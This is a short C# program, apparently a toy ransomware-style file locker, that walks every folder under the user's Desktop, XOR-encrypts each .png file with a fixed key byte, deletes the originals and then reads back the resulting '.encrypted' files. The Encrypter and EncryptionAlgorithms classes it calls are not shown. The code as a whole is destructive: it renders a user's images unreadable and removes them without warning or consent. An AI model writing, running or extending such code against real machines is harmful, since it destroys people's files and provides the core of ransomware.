using System;
using System.Collections.Generic;
using System.IO;

namespace crypt
{
    internal class Program
    {
        static byte xorNumber = 145;

        static string cryptFrom = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        static string filePattern = "*.png";

        static void Main(string[] args)
        {
            Encrypter XorEncrypter = new Encrypter((byte i) => EncryptionAlgorithms.XOR(i, xorNumber));

            foreach (string file in Directory.EnumerateFiles(cryptFrom, filePattern, SearchOption.AllDirectories))
            {
                XorEncrypter.Encrypt(file);
                File.Delete(file);
            }



            List<byte[]> files = new List<byte[]>();

            foreach (string file in Directory.EnumerateFiles(cryptFrom, "*.encrypted", SearchOption.AllDirectories))
            {
                files.Add(File.ReadAllBytes(file));
            }

            Console.ReadLine();
        }
    }
}